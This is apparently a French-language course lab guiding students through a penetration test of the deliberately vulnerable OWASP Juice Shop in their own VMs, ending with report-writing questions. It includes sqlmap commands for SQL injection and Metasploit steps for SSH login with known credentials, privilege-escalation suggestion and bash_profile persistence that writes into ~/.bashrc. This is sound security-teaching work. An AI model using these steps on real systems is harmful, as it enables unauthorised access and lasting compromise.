---
layout: default
title: "La brocante à Joseph"
nav_order: 8
has_toc: true
published: true
---

# Exercice : La Brocante à Joseph
## Test d'intrusion

*À la Brocante à Joseph, on achète vos vieilleries, on les renippe, on les revend, on les rachète, pis on ferme au bout de deux semaines.*
*À la Brocante à Joseph, tous se vend, tout revient et tourlou!*

---

## Mise en situation

Vous travaillez pour *La Brocante à Joseph*, une entreprise spécialisée dans l'achat et la revente d'items d'occasion. Pour ses activités en ligne, l'entreprise a récemment adopté la plateforme de e-commerce Juice Shop, qui gagne en popularité. En ce jeudi matin ensoleillé alors que vous rêvassiez à une victoire des Canadiens contre les Sabres de Buffalo, un mystérieux message apparaît dans votre boîte de courriels.

```
From : petitcanetonpolisson3432343@gmail.com
To : mona@brocanteajoseph.com

Bonjour. 

Le collectif SPECTRE vous informe que la plateforme Juice Shop utilisée par votre entreprise contient une vulnérabilité critique permettant à quiconque de se connecter en tant qu'administrateur, même sans connaître le mot de passe. Il s'agit d'une attaque par Injection SQL. 

Veuillez prendre les mesures nécessaires pour corriger la situation.

Bisous,

Le Petit Caneton Polisson
```

Affolé(e) à l'idée de devoir travailler ce soir au lieu de regarder le match, vous vous rappelez que vous maîtrisez déjà les outils de sécurité offensive, ce qui vous permettrait d'effectuer un test d'intrusion afin de valider les dires de ce Petit Caneton Polisson (c'est étrange, ce nom évoque un vague souvenir de jeunesse... Ce doit être un pseudonyme.) 

---

## Objectifs

- Comprendre le lien entre la sécurité offensive et les tests d'intrusion
- Appliquer les étapes d'un plan de test d'intrusion
- Rédiger un court rapport de test d'intrusion

---

## Préparation

### 1. Lancez OWASP Juice Shop
Dans votre VM applicative, démarrez OWASP Juice Shop

```bash
cd juice-shop
npm install
npm start
```

### 2. Vérifiez la connectivité

L'application vulnérable OWASP Juice Shop devrait être disponible aux adresses suivantes :

- Sur la VM applicative : `http://localhost:3000`
- À partir de la VM de sécurité offensive (Kali) : `http://<ip de votre VM applicative>:3000`

---

## 1. Reconnaissance

Il s'agit ici d'une étape d'observation passive. 

### Étapes
1. Explorez la plateforme Juice Shop en utilisant ses diverses fonctionnalités et en notant les comportements louches ou intéressants.
1. Tentez de déterminer si vous pouvez avoir accès à de l'information publique sur l'application (informations sur OWASP, ou même le code source, pourquoi pas? )

## Questions de réflexion
- Quelles informations ou comportements intéressants avez-vous remarqués ?
- Quel est l'URL du dépôt GitHub de Juice Shop ? Le code source est-il accessible au public ?


---

## 2. Énumération

Tentez maintenant de découvrir au maximum la surface d'attaque en exposant tous les points d'entrée avec l'outil des outils comme **whatweb**, **gobuster** et un **spider** de OWASP ZAP.

### Étapes

1. Lancez d'abord une analyse de Juice Shop avec l'outil **whatweb** et notez les résultats.
1. Lancez maintenant une analyse de Juice Shop avec l'outil **gobuster** et notez les résultats.
    - Visitez l'une des routes ayant retourné un code 200.
    - Visitez l'une des routes ayant retourné un code 500.
1. Lancez maintenant un *spider* OWASP ZAP sur Juice Shop

### Questions de réflexion
- Est-ce que **whatweb** pourrait normalement vous fournir des informations utiles quant à la faille d'injection SQL ?
    - Pourquoi n'est-ce pas le cas ici ?
- Lorsque vous avez visité une route ayant causé une erreur 500 avec **gobuster**, quelle information utile par rapport à la faille d'injection SQL vous a été révélée ?
- Quel outil (**whatweb**, **gobuster** ou **ZAP**) vous a donné les meilleurs résultats pour Juice Shop ? Pourquoi ?
- Quels cas sont plus appropriés pour chacun des outils:
    - whatweb ?
    - gobuster ?
    - ZAP ?

---

## 3. Analyse

Confirmez maintenant que la route découverte à l'étape précédente est bien celle utilisée par l'authentification dans Juice Shop.

## Étapes

1. À l'aide de l'outil Burp Suite, interceptez une requête d'authentification
1. Sous l'onglet **HTTP history**, faites un clic droit sur la requête d'authentification, puis sélectionnez **Save item**
    - Sauvegardez la requête dans un fichier `requete.txt`

## Questions de réflexion

- Dans quelle(s) circonstance(s) un outil comme Burp Suite excelle-t-il ?
- Quelles sont ses avantages par rapport à un outil d'énumération comme **whatweb**, **gobuster** ou **ZAP**?
- Quels sont ses inconvénients par rapport à un outil d'énumération comme **whatweb**, **gobuster** ou **ZAP**?

---

## 4. Exploitation

Vérifiez que la route d'authentification est bel et bien vulnérable aux injections SQL.

## Étapes

1. À l'aide de l'outil **sqlmap**, validez que la route d'authentification est vulnérable à l'injection SQL.

{: .astuce}
> Plutôt que d'utiliser une URL, il sera plus efficace ici d'utiliser la requête vulnérable sauvegardée à l'étape précédente. Une requête du format suivant serait appropriée :
>
>```bash
> sqlmap -r <requête> --batch --level=5 -p <paramètre vulnérable>
>```

## Questions de réflexion
- **sqlmap** a-t-il été en mesure de détecter la faille d'injection SQL ? Pourquoi ?
- **sqlmap** a-t-il été en mesure d'exploiter directement la faille d'injection SQL en devenant administrateur ? Pourquoi ?


## 5. Post-exploitation

On suppose maintenant que l'obtention de l'accès `admin@juice-sh.op` vous a permis d'obtenir une combinaison usager/mot de passe qui est également utilisée comme compte directement sur le serveur. Pour simuler ce cas, on utilisera notre compte `dev/dev`, mais cela fonctionnerait avec tout compte ayant un accès SSH au serveur sur lequel s'exécute Juice Shop.

## Étapes
1. Utiliser le module `ssh_login` de Metasploit pour obtenir une session en utilisant les identifiants recueillis
    ```bash
    mfsconsole
    use auxiliary/scanner/ssh/ssh_login
    set RHOST <IP de votre VM applicative>
    set RPORT 22
    set USERNAME dev
    set PASSWORD dev
    run
    ```
1. Vous devriez voir la sortie suivante :
    ```bash
    SSH Session <ID> opened [...]
    ```
1. Faites un *upgrade* de la connexion
    
    ```bash
    sessions -u <ID obtenu à l'étape précédente>
    ```

    {: .astuce}
    > Cela permet à Metasploit de démarrer une session qui utilise Meterpreter, le langage de *shell* qu'il utilise pour la majorité de ses modules de post-exploitation.

1. Vous devriez voir la sortie suivante :
    ```bash
    SSH Session <NOUVEL_ID> opened [...]
    ```
    Il s'agit d'une nouvelle session *upgradée*.

1. Utilisez maintenant le module d'énumération système pour en apprendre plus sur le serveur
    ```bash
    use post/linux/gather/enum_system
    set SESSION <NOUVEL_ID>
    run
    ```

1. Utilisez maintenant le module de suggestion de vulnérabilités pour que Metasploit vous suggère des failles à exploiter (s'il y a lieu)
    ```bash
    use post/multi/recon/local_exploit_suggester
    set SESSION <NOUVEL_ID>
    run
    ```

    {: .astuce}
    > Si vous recevez une erreur de type `NameError unitialized constant HTTP`, il suffit de recharger les modules avec la commande suivante, puis de relancer le module :
    >```bash
    > reload_all
    > run
    >```

1. Tentez d'exploiter l'une des vulnérabilités rapportées par le module `local_exploit_suggester` à l'aide d'un module de post-exploitation. Par exemple :
    ```bash
    use exploit/linux/persistence/bash_profile
    set payload cmd/unix/generic
    set CMD echo "hacked!"
    set SESSION <NOUVEL_ID>
    run
    ```
1. Sur la machine applicative, vérifiez que votre commande a bien été injectée dans le fichier ~/.bashrc.

    {: .astuce}
    > Il s'agit d'une attaque particulièrement efficace, puisque le fichier `.bashrc` est exécuté à chaque connexion d'un utilisateur. Ainsi, l'attaquant peut s'assurer qu'un script s'exécute à chaque connexion de l'utilisateur compromis!


## 6. Rapport

## Questions
- Quelle information inclueriez-vous dans la section "Portée" de votre rapport de test d'intrusion ?
- Quelle information inclueriez-vous dans la section "Méthodologie" de votre rapport de test d'intrusion ?
- Quelle information inclueriez-vous dans la section "Analyse globale" de votre rapport de test d'intrusion ?
- Quelle information inclueriez-vous dans la section "Résultats détaillés" de votre rapport de test d'intrusion ?
- Quelle information inclueriez-vous dans la section "Recommandations" de votre rapport de test d'intrusion ?
- Quelle information inclueriez-vous dans la section "Conclusion" de votre rapport de test d'intrusion ?
- En fonction de vos réponses ci-haut, rédigez un bref sommaire exécutif qui pourrait être utilisé par des décideurs suite à votre test d'intrusion.


